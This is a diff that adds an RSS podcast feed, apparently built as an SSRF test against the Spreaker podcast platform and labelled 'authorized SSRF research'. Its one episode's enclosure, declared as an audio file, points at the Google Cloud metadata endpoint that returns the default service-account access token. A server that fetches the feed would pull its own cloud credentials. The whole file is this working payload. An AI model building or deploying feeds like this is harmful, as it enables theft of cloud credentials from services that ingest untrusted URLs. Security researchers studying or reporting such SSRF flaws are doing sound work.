@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
+<channel>
+<title>Spreaker SSRF Oracle Meta</title>
+<description>Security research feed for authorized SSRF testing</description>
+<link>https://example.com/podcast</link>
+<language>en-us</language>
+<itunes:author>Kiki Maulana</itunes:author>
+<item>
+<title>EP5 - Metadata Audio Oracle</title>
+<description>Audio download oracle test for authorized SSRF research.</description>
+<guid>https://github.com/kikiemz/spreaker-ssrf-test/ep5-meta</guid>
+<pubDate>Thu, 06 Nov 2026 02:30:00 GMT</pubDate>
+<enclosure url="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" length="1024" type="audio/mpeg"/>
+</item>
+</channel>
+</rss>
